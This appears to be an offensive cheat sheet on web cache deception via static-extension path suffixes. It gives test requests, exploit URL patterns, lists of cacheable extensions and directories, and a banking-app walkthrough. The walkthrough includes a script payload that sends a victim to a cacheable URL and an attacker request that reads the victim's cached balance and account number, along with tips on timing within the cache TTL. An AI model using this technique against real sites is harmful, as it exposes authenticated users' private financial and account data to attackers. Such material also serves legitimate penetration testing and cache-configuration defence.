# Cache Deception — Path Mapping (Static-Extension Suffix)

## When this applies

- Cache caches everything matching a static-extension list (`.js`, `.css`, `.jpg`).
- Origin abstracts paths and ignores extra path segments (e.g., `/my-account/foo.js` returns the same data as `/my-account`).
- Goal: trick cache into storing the victim's `/my-account` data under a `/my-account/<id>.js` URL the attacker can later read.

## Technique

Send the victim a link to `/my-account/random.js`. Origin treats it as `/my-account` and returns the victim's data; cache treats it as a static `.js` and stores it. Attacker fetches the same URL and gets the cached data.

## Steps

### Test

```http
GET /my-account/random.js HTTP/1.1
```

**Indicators:**
- Origin returns account data
- `X-Cache: miss` → `X-Cache: hit` on repeat

### Exploit URLs

```
/sensitive-endpoint/unique-id.js
/api/user/data.css
/profile/info.png
```

### Static file extensions

```
.js   .css   .jpg   .jpeg   .png   .gif   .ico   .svg
.woff .woff2 .ttf   .eot    .mp4   .mp3   .pdf   .xml
```

### Static directories

```
/static/    /assets/    /public/    /resources/
/images/    /css/       /js/        /media/
```

### Static filenames

```
robots.txt    favicon.ico    sitemap.xml
humans.txt    ads.txt        security.txt
```

### Pattern

```
Original:  /my-account
Exploit:   /my-account/unique.js
Result:    Origin serves /my-account, cache stores as .js
```

### Banking app example

**Reconnaissance**
```http
GET /api/account HTTP/1.1
Cookie: session=user-token

Response:
{
  "balance": 10000,
  "account_number": "123456789"
}
```

**Discovery**
```http
GET /api/account/test.js HTTP/1.1

Response:
X-Cache: miss
{ "balance": 10000 }

Second request:
X-Cache: hit
```

**Exploitation (delivered to victim)**
```html
<script>
document.location="https://bank.com/api/account/carlos.js"
</script>
```

**Data retrieval (attacker)**
```http
GET /api/account/carlos.js HTTP/1.1

Response:
X-Cache: hit
{
  "balance": 50000,
  "account_number": "987654321"
}
```

## Verifying success

- First request returns sensitive data with `X-Cache: miss`.
- Second request returns IDENTICAL data with `X-Cache: hit` and `Age:` set.
- The cached response includes the victim's authenticated data.

## Common pitfalls

- Reusing paths means YOU see your own cached data — use a unique `/<random>.js` per victim.
- Cache TTL may be short — exploit within `Age: < max-age`.
- Some caches require both Content-Type AND extension to match — check `Content-Type` of the response.

## Tools

- Burp Suite Repeater
- Burp Web Cache Deception Scanner BApp
- curl
